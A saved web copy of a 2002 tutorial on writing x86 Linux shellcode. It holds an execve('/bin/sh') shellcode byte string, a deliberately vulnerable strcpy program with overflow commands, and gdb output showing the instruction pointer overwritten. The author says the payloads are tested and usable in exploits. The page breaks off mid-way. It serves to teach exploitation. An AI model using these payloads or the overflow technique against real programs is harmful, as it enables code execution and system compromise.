<!DOCTYPE html PUBLIC "-//w3c//dtd html 4.0 transitional//en">
<!-- saved from url=(0074)http://www.safemode.org/files/zillion/shellcode/doc/Writing_shellcode.html -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
   
   <meta name="GENERATOR" content="Mozilla/4.79 [en] (X11; U; Linux 2.4.2 i386) [Netscape]">
   <title>Writing shellcode</title>
</head>
<body>

<h1>
<br>
<br>
<br></h1>

<h2>
<u>Introduction:</u></h2>

<pre>Author: zillion (safemode.org)
Date: 10-04-2002</pre>

<pre>I wrote this document for the purpose of self-education and made it public
so that it might be useful to other. This is not the type of document&nbsp;
from which you can expect to learn shellcode developement in 21 hours ;-) If&nbsp;
you are completely new to this subject, try playing with assembly a bit and&nbsp;
take it easy with this file.</pre>

<pre>The shellcodes presented here have all been tested to work can be used in most exploits without a problem. However, these codes may cause serious damage&nbsp; to your computer and should therefor only be used against TEST systems that have&nbsp; NO network connectivity!. Imagin what happens if you run the backdoor on you system&nbsp; and forget about it....</pre>

<pre>If you have any comments or questions please feel free to them to mail me!</pre>

<pre><a href="mailto:zillion@safemode.org">zillion</a></pre>

<h2>
<u>Processing assembly code:</u></h2>

<pre>I prefer using nasm to compile assembly code and the examples used in this
document are all written in the nasm syntax. Using nasm to compile the assembly
code can be done as follows:</pre>

<pre>nasm -o prog prog.S</pre>

<pre>After executing this command, the file 'prog' will contain our binary data
that we will translate to the shellcode.&nbsp; At this point you will not be able
to execute this data directly from command line. You can use the <a href="http://www.safemode.org/files/zillion/shellcode/doc/Writing_shellcode.html#process">utility</a> that
is placed at the end of this document. Usage of this tool will look like this:</pre>

<pre>gcc -o s-proc s-proc.c&nbsp;
bash-2.04$ ./s-proc -e prog
Calling code ...
sh-2.04$ exit
bash-2.04$ ./s-proc -p prog


char shellcode[] =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x42\x42\x42\x42";


bash-2.04$</pre>

<h2>
<u>Memory corruption:</u></h2>

<pre>Shellcode can be seen as a list of instructions that has been developed
in a manner that allows it to be injected in an application during runtime.</pre>

<pre>Injecting shellcode in application can be done trough many different security&nbsp;
holes of which buffer overflows are the most popular ones. In order to explain
how shellcode is used, I will give a small buffer overflow example by using
the following c program:</pre>

<pre>void main(int argc, char **argv, char **envp) {

char array[200];
strcpy(array,argv[1]);

}</pre>

<pre>If we compile this (gcc -o overflow overflow.c) and execute it with a very
large string of characters we can overwrite memory:</pre>

<pre>On linux:</pre>

<pre>[root@droopy done]#&nbsp; ./overflow `perl -e 'print "A" x 220'`BBBB
Segmentation fault (core dumped)
[root@droopy done]#</pre>

<pre>On FreeBSD:</pre>

<pre>[root@freebsd done]#&nbsp; ./overflow `perl -e 'print "A" x 204'`BBBB
Segmentation fault (core dumped)
[root@freebsd done]#</pre>

<pre>Well that doesn't look good now does it ? ;-) It appears that we forced some
memory corruption with the 220 A's and 4 B's that where given to the program
as argument during the execution. That argument exceeded the size of the array&nbsp;
and as a result of this, data that was stored behind this array got overwritten.&nbsp;
You can see what happend by using gdb (the GNU debugger) to analyze the core&nbsp;
dump file. Output generated by gdb often looks very scary for newcommers but&nbsp;
have no fear.. there is a <a href="http://www.gnu.org/manual/gdb-5.1.1/gdb.html">manual</a>.

BTW if you did not get a coredump try more A's or set ulimit to a number
such as 99999 ( ulimit -c 99999 )</pre>

<pre>[root@droopy done]# gdb -core=core&nbsp;
GNU gdb 5.0
Copyright 2000 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.&nbsp; Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux".
Core was generated by `./overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
Program terminated with signal 11, Segmentation fault.
#0&nbsp; 0x42424242 in ?? ()
(gdb) info all
eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffff990&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -1073743472
ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xfffffdc3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -573
edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffcad&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -1073742675
ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x4013b824&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1075034148
esp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffa70&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffa70
<b>ebp</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141
</b>esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffad4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -1073743148
edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0
<b>eip</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>0x42424242&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x42424242
</b>eflags&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x10286&nbsp; 66182
cs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x23&nbsp;&nbsp;&nbsp;&nbsp; 35
ss&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x2b&nbsp;&nbsp;&nbsp;&nbsp; 43
ds&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x2b&nbsp;&nbsp;&nbsp;&nbsp; 43
es&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x2b&nbsp;&nbsp;&nbsp;&nbsp; 43
fs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x2b&nbsp;&nbsp;&nbsp;&nbsp; 43
gs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x2b&nbsp;&nbsp;&nbsp;&nbsp; 43
st0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (raw 0x00000000000000000000)
st1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (raw 0x00000000000000000000)
st2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (raw 0x00000000000000000000)
st3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (raw 0x00000000000000000000)
st4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (raw 0x00000000000000000000)
st5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (raw 0x00000000000000000000)
st6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (raw 0x00000000000000000000)
st7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (raw 0x00000000000000000000)
fctrl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0
fstat&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0
ftag&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0
fiseg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0
fioff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0
foseg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0
fooff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0
fop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0</pre>

<pre>So by using GDB we can see the contents of all registers at the time 'overflow'
got killed. I have made the most important registers bold. EBP and EIP are 32 bit
registers (32/8 = 4 Byte) and are holding the last 8 bytes of our argument.

In the above gdb output you can see that lines 'EBP' and 'EIP' are made bold.
These are important lines from which we can indicate that memory was overwritten
with data we control. As you can see EBP holds the value <b>0x41414141</b>. 41 is the&nbsp;
hex value for A meaning that EBP contains AAAA. The EIP register holds <b>0x42424242</b>.
42 is the hex value of B meaning that EIP holds BBBB.</pre>

<pre>You can also use gdb to examine more memory by using the 'x' command. In this case&nbsp;
we can see our buffer by using the command 'x/150 0xbffffa70' where 0xbffffa70 is&nbsp;
the value that is obtained from the ESP register:</pre>

<pre>&nbsp;(gdb) x/150 $esp
0xbffffa70:&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffad4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffae0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0804830e
0xbffffa80:&nbsp;&nbsp;&nbsp;&nbsp; 0x080482e4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x4013b824&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffaa8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x40037b4c
0xbffffa90:&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffae0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x4013a358&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x40016638
0xbffffaa0:&nbsp;&nbsp;&nbsp;&nbsp; 0x00000002&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x08048380&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x080483a1
0xbffffab0:&nbsp;&nbsp;&nbsp;&nbsp; 0x0804845c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000002&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffad4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x080482e4
0xbffffac0:&nbsp;&nbsp;&nbsp;&nbsp; 0x080484cc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x4000df24&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffacc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x40016c0c
0xbffffad0:&nbsp;&nbsp;&nbsp;&nbsp; 0x00000002&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffbc1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffbcc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000
0xbffffae0:&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffcad&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffcce&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffced&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffd0f
0xbffffaf0:&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffd1b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffede&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffefd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbfffff13
0xbffffb00:&nbsp;&nbsp;&nbsp;&nbsp; 0xbfffff1e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbfffff2d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbfffff35&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbfffff45
0xbffffb10:&nbsp;&nbsp;&nbsp;&nbsp; 0xbfffff53&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbfffff64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbfffff6f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbfffff80
0xbffffb20:&nbsp;&nbsp;&nbsp;&nbsp; 0xbfffffa3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbfffffb6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbfffffc3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000
0xbffffb30:&nbsp;&nbsp;&nbsp;&nbsp; 0x00000003&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x08048034&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000004&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000020
0xbffffb40:&nbsp;&nbsp;&nbsp;&nbsp; 0x00000005&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000006&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000006&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00001000
0xbffffb50:&nbsp;&nbsp;&nbsp;&nbsp; 0x00000007&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x40000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000008&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000
0xbffffb60:&nbsp;&nbsp;&nbsp;&nbsp; 0x00000009&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x08048380&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0000000b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000
0xbffffb70:&nbsp;&nbsp;&nbsp;&nbsp; 0x0000000c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0000000d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000
0xbffffb80:&nbsp;&nbsp;&nbsp;&nbsp; 0x0000000e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000010&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0080f9ff
0xbffffb90:&nbsp;&nbsp;&nbsp;&nbsp; 0x0000000f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xbffffbbc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000
0xbffffba0:&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000
0xbffffbb0:&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x36383669
0xbffffbc0:&nbsp;&nbsp;&nbsp;&nbsp; 0x6f2f2e00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x66726576&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x00776f6c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141
0xbffffbd0:&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141
0xbffffbe0:&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141
0xbffffbf0:&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141
0xbffffc00:&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141
0xbffffc10:&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141
0xbffffc20:&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141
0xbffffc30:&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141
0xbffffc40:&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141
0xbffffc50:&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141
0xbffffc60:&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141
0xbffffc70:&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141
0xbffffc80:&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141
0xbffffc90:&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141
0xbffffca0:&nbsp;&nbsp;&nbsp;&nbsp; 0x41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>0x41414141</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>0x42424242</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x44575000
0xbffffcb0:&nbsp;&nbsp;&nbsp;&nbsp; 0x6f682f3d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x6e2f656d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x736c6569&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x6f7a2f68
0xbffffcc0:&nbsp;&nbsp;&nbsp;&nbsp; 0x722f656e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x79646165
(gdb)</pre>

<pre>Here we can see that EBP and EIP are located directly behind eachother. Now
what most exploit do is that they put an address in EIP (Instruction pointer)
that points to instructions they have put in the buffer that caused the
overflow. Instructions ?? hey that includes our shellcode !! ;-)</pre>

<h2>
<u>Using the registers:</u></h2>

<pre>Intel has 32 bit registers that can be split up in 16 and 8 bit. When developing
shellcode you will find out that using the smallest registers often prevents
having NULL bytes in code. Also using the right register for the right value
should be considered effective programming. I mean would you put a mouse in a
cage that was created for an elephant ?? I tought so ! ;p . Now lets have a look
at the registers that we will be using.</pre>

<br><table border="" cols="4" width="50%" nosave="">
<caption></caption><tbody>
</tbody>

<tbody><tr>
<td><b>32 Bit</b></td>

<td><b>16 Bit</b></td>

<td><b>8 Bit </b>(High)&nbsp;</td>

<td><b>8 Bit</b> (Low)</td>
</tr>

<tr>
<td>EAX</td>

<td>AX</td>

<td>AH</td>

<td>AL</td>
</tr>

<tr>
<td>EBX</td>

<td>BX</td>

<td>BH</td>

<td>BL</td>
</tr>

<tr>
<td>ECX</td>

<td>CX</td>

<td>CH</td>

<td>CL</td>
</tr>

<tr>
<td>EDX</td>

<td>DX</td>

<td>DH</td>

<td>DL</td>
</tr>
</tbody></table>

<pre>EAX, AX, AH and AL are called the 'Accumulator' registers and can be used for I/O&nbsp;
port access, arithmetic, interrupt calls etc. Later in this document you will see&nbsp;
that we can use these registers to use system calls.</pre>

<pre>EBX, BX, BH, and BL are the 'Base' registers and are used as base pointers for&nbsp;
memory access. You will see later on that we will use this register to store&nbsp;
pointers in for arguments of system calls. This register is also sometimes used
to store return value from an interrupt in. An example of this can be seen when
using the 'open' systems call. When you opened a file with this system call then
the 'file' descriptor, which can be used for I/O with the opened file, will be&nbsp;
stored in the EBX register.</pre>

<pre>ECX, CX, CH, and CL are also known as the 'Counter' registers. In the examples
of this document you will see a loop that uses CL as a counter and some examples
that will use ECX to store pointers in.</pre>

<pre>EDX, DX, DH, and DL are called the 'Data' registers and can be used for I/O port
access , arithmetic and some intrerrupt calls.</pre>

<pre>When you want to execute a system call you will have to use these registers to&nbsp;
prepare the system call. A very simple example is the exit(0) syscall:</pre>

<pre>mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al, 0x01&nbsp; ; <i>The syscall number for exit
</i>xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, ebx&nbsp; ; <i>EBX will now contain the value 0
</i>int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>and activate !&nbsp;

</i>It is important to always use the smallest registers available to store you data
in. This to avoid NULL bytes in shell code. For example if we would use the following
exit code:</pre>

<pre>BITS 32
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>exit(0) code
</i>mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>eax</b>, 0x01&nbsp; ; <i>The syscall number for exit
</i>xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, ebx&nbsp;&nbsp; ; <i>EBX will now contain the value 0
</i>int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>and activate !

</i>The register 'eax' will be to large to hold our byte with the result that NULL bytes&nbsp;
will exist in our shellcode result:</pre>

<pre>su-2.05a# s-proc -p exit

char shellcode[] =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xb8\x01<b>\x00\x00\x00</b>\x31\xdb\xcd\x80";


By using 'ndisasm' , which is part of the nasm package, we can see how the large register
is translated:

su-2.05a# ndisasm exit
00000000&nbsp; B801<b>00</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov ax,0x1
00000003&nbsp; <b>0000</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add [bx+si],al&nbsp;
00000005&nbsp; 31DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor bx,bx
00000007&nbsp; CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int 0x80



</pre>

<h2>
<u>The addressing problem:</u></h2>

<pre>In most cases of shellcode you cannot use hardcoded memory addresses. So in&nbsp;
order to know where your data is located, you'll need to do a little trick:

jmp short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stuff&nbsp;&nbsp;&nbsp;
code:
pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi</pre>

<pre>&lt;data&gt;

stuff:
call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; code&nbsp;
db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'This is my string#'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

What you see in the above code is that we 'jmp' from the beginning of the&nbsp;
code to 'stuff' from where we 'call code'. At the beginning from 'code' we&nbsp;
'pop esi'. Now esi will represent the location of the string 'This is my string'&nbsp;
&nbsp;

In the above sample [esi + 1] represents 'h' from the word 'This'.&nbsp;&nbsp;

</pre>

<h2>
